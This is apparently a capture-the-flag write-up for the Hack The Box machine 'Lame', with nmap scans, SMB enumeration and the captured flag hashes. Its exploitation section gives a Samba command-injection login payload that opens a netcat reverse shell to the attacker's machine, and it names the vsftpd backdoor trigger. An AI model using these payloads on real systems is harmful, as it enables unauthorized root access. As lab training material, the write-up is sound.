# Lame


# Reconnaissance

```
scan command:

$ nmap -Pn --script=http-tile --open $IP -oN nmapScan/init

output:

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-25 12:37 -03
Nmap scan report for 10.10.10.3
Host is up (0.18s latency).
Not shown: 996 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

scan command:

$ sudo nmap -Pn -sV --open $IP -oN nmapScan/version

output:

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-25 12:42 -03
Nmap scan report for 10.10.10.3
Host is up (0.16s latency).
Not shown: 996 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux\_kernel

scan command:

$ sudo nmap -Pn -O -p- -sV --open $IP -oN nmapScan/full

output:

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-25 12:46 -03
Nmap scan report for 10.10.10.3
Host is up (0.13s latency).
Not shown: 65530 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%)
No exact OS matches for host (test conditions non-ideal).

```


# Enumeration

```
There are several points of entry to the machine:

21/tcp   ftp  vsftpd 2.3.4
Version of FTP vulnerable to backdor command execution that is treggered by entering a string that contains the characters ":)" as username

22/tcp   ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
SSH probably susceptible to brute force

139/tcp  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
The Samba SMB server is accessible via smbclient with anonymous login allowed:

An error will appear the first time you attempt to connect
$ smbclient -L 10.10.10.3
protocol negotiation failed: NT\_STATUS\_CONNECTION\_DISCONNECTED

In order get it to work, edit the SMB configuration file
	vim /etc/samba/smb.conf
Under GLOBAL, add the two following settings:
client min protocol = CORE
client max protocol = SMB3

Then, try again:
$ smbclient -L 10.10.10.3
Enter WORKGROUP\nimitzufo's password:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------

the /tmp share looks promising 

"tmp             Disk      oh noes!"
```

# Exploitation

```
use smbclient to log into the box and send the reverse shell back to the attacking machine

$ smbclient //10.10.10.3/tmp
Enter WORKGROUP\user password:
Anonymous login successful

on another terminal, set up a listener to receive the incoming shell

	nc -lnvp 64444
	Listening on 0.0.0.0 64444

back on smb, place the payload and wait for the shell

Try "help" to get a list of possible commands.
smb: \> logon "/=`nc 10.10.14.3 64444 -e /bin/sh`"
Password:

Connection received on 10.10.10.3 48210"
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old

no priviledge escalation is required since we're already root

find / -type f -iname "root.txt" 2\>/dev/null
/root/root.txt
find / -type f -name "user.txt" 2\>/dev/null
/home/makis/user.txt
cat /home/makis/user.txt
3329cb44627fd02d8c79c64806b5724f
cat /root/root.txt
8b0628c1421d201a6b88b0344ae412b3
```
